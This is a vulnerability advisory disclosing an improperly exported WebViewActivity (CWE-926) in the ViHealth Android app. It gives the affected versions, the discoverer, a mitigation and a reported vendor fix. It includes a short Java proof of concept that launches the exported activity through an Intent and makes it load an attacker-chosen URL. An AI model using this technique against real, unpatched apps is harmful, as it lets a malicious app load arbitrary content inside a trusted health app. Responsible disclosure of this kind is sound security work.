

Vendor of Product: Viatom Tech                                                                                                                                                                                                                                                                                                                                                                      
Vulnerability Type:   CWE-926: Improper Export of Android Application Components

Affected Product:  ViHealth Android App V. 2.74.58* & earlier

Affected Component: Exported Activity "com.viatom.baselib.mvvm.web.WebViewActivity"

Attack Type: Adjacent

To exploit the vulnerability, the attacker needs to have a victim install a 3rd party Android app on their device

Discoverer: Edward Warren

The Android application exports a component for use by other applications but does not properly restrict which applications can launch the component or access the data it contains.

See https://cwe.mitre.org/data/definitions/926.html

This issue can be mitigated by changing exported status of the activity reflected on the AndroidManifest.xml entry:

["activity android:name="com.viatom.baselib.mvvm.web.WebViewActivity" android:exported="true" android:screenOrientation="portrait""]


An attacker could craft a 3rd party app using the following code to load the url of their choice within the context of the exported activity of your application to facilitate malicious actions:



********************************************************************************************************************************
// Create an Intent to start the exported WebViewActivity of the target app
Intent launch = new Intent();
launch.setClassName("com.viatom.vihealth", "com.viatom.baselib.mvvm.web.WebViewActivity");

// Put the URL to be loaded in the WebViewActivity
launch.putExtra("web_url", "https://www.windows93.net");

// Start the activity
startActivity(launch);
********************************************************************************************************************************



**This issue has been fixed today (6/19/23) with the app ViHealth (V. 2.74.62)-shortly after I reported it to the vendor on 6/10/23.
